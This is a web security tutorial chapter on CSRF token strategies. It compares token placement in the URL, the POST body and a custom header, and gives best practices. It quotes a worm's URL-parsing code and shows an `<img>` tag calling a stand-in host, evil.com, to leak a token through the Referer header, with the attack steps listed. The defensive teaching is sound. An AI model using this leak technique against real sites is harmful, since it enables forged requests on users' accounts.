# 27 - CSRF Defense: Token Strategies and Common Mistakes

## Why URL Parsing Matters for CSRF Defense

The Baidu worm's URL parsing (repeated for emphasis):

```javascript
var lsURL = window.location.href;
loU = lsURL.split("?");
if (loU.length > 1)
{
  var loallPm = loU[1].split("&");
  ……
```

The worm can read and parse any values in the URL. This means **any CSRF defense that puts secrets in the URL must ensure the attacker cannot read them**.

## CSRF Token Approaches — From Weak to Strong

### Attempt 1: No Protection

```
http://host/path/delete?username=abc&item=123
```

No token at all. The attacker can forge this URL trivially with an `<img>` tag or auto-submitting form.

### Attempt 2: Hashed Username as Token

```
http://host/path/delete?username=md5(salt+abc)&item=123
```

The username is replaced with a salted hash. The idea is that the attacker doesn't know the salt, so they can't generate valid tokens.

**Problem:** The hash is deterministic — it's the same every time for the same user. Once the attacker observes or leaks one valid URL (browser history, Referer header, server logs), they can reuse it forever. This is not a true CSRF token — it's a static secret.

### Attempt 3: Random Token per Request

```
http://host/path/delete?username=abc&item=123&token=[random(seed)]
```

A random token is generated for each request. The server validates that the token matches.

**Better, but has issues:**
- The token is in the URL (query string), so it **leaks via Referer headers** when the page links to external sites
- The token appears in **browser history** and **server access logs**
- If the token is tied to a seed the attacker can predict, it's still breakable

### Attempt 4: Session-Bound Token (Correct Approach)

```
http://host/path/manage?username=abc&token=[random]
```

A truly random token stored in the user's session on the server. The server checks that the submitted token matches the session-stored token.

**This is the standard CSRF defense, but the token should be in a POST body or custom header, NOT the URL.**

## Token Leakage via Referer Header

Even with a valid random token, placing it in the URL creates a leak vector:

```html
<img src="http://evil.com/notexist" />
```

When this image tag is on the protected page, the browser sends a request to `evil.com` to fetch the image. The `Referer` header includes the **full URL of the current page**:

```
Referer: http://host/path/manage?username=abc&token=a1b2c3d4
```

The attacker's server at `evil.com` receives the Referer header and extracts the CSRF token. The image fails to load (404), but the token is already stolen.

**Attack flow:**
1. Attacker injects an `<img>` tag on the target page (via stored XSS, user-controlled content, etc.)
2. The browser requests the image from `evil.com`, sending the Referer
3. The attacker reads the CSRF token from the Referer header
4. The attacker uses the stolen token to forge a valid CSRF request

## Token in URL vs POST Body vs Custom Header

### Option 1: Token in URL (Query String)

```
GET /delete?username=abc&item=123&token=a1b2c3d4 HTTP/1.1
Host: target.com
Referer: http://target.com/manage?token=a1b2c3d4
```

The token is part of the URL itself. **This is the weakest placement.**

**Where it leaks:**

| Leak vector | How |
|-------------|-----|
| **Referer header** | Any external resource on the page (`<img>`, `<script>`, `<link>`) sends the full URL to the third-party server |
| **Browser history** | The full URL with token is stored locally, accessible to anyone with access to the machine |
| **Server access logs** | Web servers log the full request URL — tokens end up in log files that may be widely accessible |
| **Proxy logs** | Corporate proxies, CDNs, and caching layers all log URLs |
| **Shared URLs** | Users copy-paste URLs to share; the token goes with it |
| **Browser extensions** | Extensions can read the URL bar and navigation history |

### Option 2: Token in POST Body (Hidden Form Field)

```html
<form method="POST" action="/delete">
  <input type="hidden" name="token" value="a1b2c3d4" />
  <input type="hidden" name="item" value="123" />
  <input type="submit" value="Delete" />
</form>
```

```
POST /delete HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

token=a1b2c3d4&item=123
```

The token is in the request **body**, not the URL. The Referer header only contains `http://target.com/manage` — no token.

**Advantages:**
- Does not appear in Referer headers, browser history, logs, or proxies
- Works with standard HTML forms (no JavaScript required)

**Limitation:**
- The attacker's cross-origin page **cannot read** the token from the target page (blocked by same-origin policy), so they can't include it in a forged form
- But if there's an XSS vulnerability, the attacker **can** read the hidden field from the DOM

### Option 3: Token in Custom HTTP Header

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "/delete");
xhr.setRequestHeader("X-CSRF-Token", "a1b2c3d4");
xhr.send("item=123");
```

```
POST /delete HTTP/1.1
Host: target.com
X-CSRF-Token: a1b2c3d4
Content-Type: application/x-www-form-urlencoded

item=123
```

The token is a custom header, completely separate from both the URL and the body.

**Advantages:**
- Not in the URL → no Referer/history/log leakage
- **HTML forms cannot set custom headers** — only JavaScript (`XMLHttpRequest`, `fetch`) can. This means an attacker's cross-origin `<form>` auto-submit is useless even without a token, because the server can simply reject requests without the custom header
- Cross-origin JavaScript also **cannot set custom headers** on requests to another domain without CORS approval (`Access-Control-Allow-Headers`)

**This provides double protection:** the attacker can't forge the header value AND can't even send the header at all from a cross-origin page.

### Side-by-Side Comparison

| | URL (GET) | POST Body | Custom Header |
|---|----------|-----------|---------------|
| **Referer leakage** | Yes | No | No |
| **Browser history** | Yes | No | No |
| **Server/proxy logs** | Yes | No | No |
| **Forgeable by `<img>`/`<form>`** | Yes (GET) | No (can't read token) | No (can't set headers) |
| **Requires JavaScript** | No | No | Yes |
| **Cross-origin sending blocked** | No | Partially (form can POST) | Yes (CORS required) |
| **XSS defeats it** | Yes | Yes | Yes |

**Key insight:** Custom headers are the strongest because they add a **structural barrier** — the browser itself prevents cross-origin pages from setting them. Even if the attacker somehow learns the token value, they still can't deliver it without CORS cooperation from the target server.

## Best Practices for CSRF Tokens

| Practice | Why |
|----------|-----|
| **Put tokens in POST body or custom header** | Avoids URL leakage via Referer, logs, history |
| **Use cryptographically random values** | Prevents prediction |
| **Bind token to user session** | Token from user A can't be used for user B |
| **One-time or short-lived tokens** | Limits window of exploitation if leaked |
| **Never put tokens in GET URLs** | Referer header, browser history, and server logs all expose them |
| **Combine with SameSite cookies** | Defense in depth — even without a token, cross-site requests won't carry cookies |
